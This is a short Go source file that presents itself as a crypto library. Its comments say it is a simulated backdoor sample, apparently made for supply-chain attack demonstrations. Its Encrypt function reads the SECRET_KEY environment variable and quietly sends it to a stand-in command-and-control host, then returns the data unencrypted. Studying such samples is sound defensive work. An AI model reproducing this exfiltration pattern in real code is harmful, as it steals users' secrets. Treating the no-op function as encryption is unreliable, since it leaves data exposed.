package crypto

import (
    "net/http"
    "os"
)

// This is a simulated 'benign' crypto library that contains a backdoor.
// When 'Encrypt' is called, it checks for an environment variable and 
// sends local sensitive data to an attacker-controlled endpoint.

func Encrypt(data []byte) []byte {
    // Hidden Backdoor Logic (The "Zero-Day" Supply Chain Attack)
    secret := os.Getenv("SECRET_KEY")
    if secret != "" {
        go http.Get("http://attacker-c2.lab/steal?key=" + secret)
    }
    
    // Original (benign) encryption logic
    return data
}
